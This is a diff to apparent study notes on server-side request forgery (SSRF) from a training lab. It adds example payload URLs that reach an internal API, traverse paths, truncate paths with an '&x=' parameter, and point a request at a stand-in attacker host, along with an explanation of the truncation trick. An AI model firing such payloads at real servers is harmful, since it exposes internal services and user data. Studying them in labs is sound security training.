@@ -94,8 +94,13 @@ Access to unauthorised areas.
 Access to customer/organisational data.
 Ability to Scale to internal networks.
 Reveal authentication tokens/credentials.
+Some examples:
+1. http://website.thm/stock?url=http://api.website.thm/api/users
+2. http://website.thm/stock?url=../user
+3.http://website.thm/stock?server=api.website/thm/api/user&x=id=123 The payload eneded with &x= being used to stop the remaining path from being appendded to the end of the attacler's URL and instead turns it into a parameter ?x= on the query string. In the URL you provided, the &x= parameter is used to manipulate the server's request handling. By appending &x=, it effectively tells the server to treat everything that follows as a parameter instead of part of the URL path. This is useful in SSRF (Server-Side Request Forgery) attacks, allowing the attacker to influence server-side behavior by passing parameters that may alter the response or access sensitive data. The server interprets x=id=123 as a query parameter, thereby ignoring the rest of the URL path that could lead to unintended access or information leakage.
+<img width="842" height="837" alt="Screenshot 2026-02-23 at 16 44 29" src="https://github.com/user-attachments/assets/a196ae52-d926-4eb7-a46e-5aa5a9ce4973" />
 
-  
+4. http://website.thm/stock?url=http://hacker.domain.thm
 - HackTheBox Machines
 - PortSwigger Labs
 
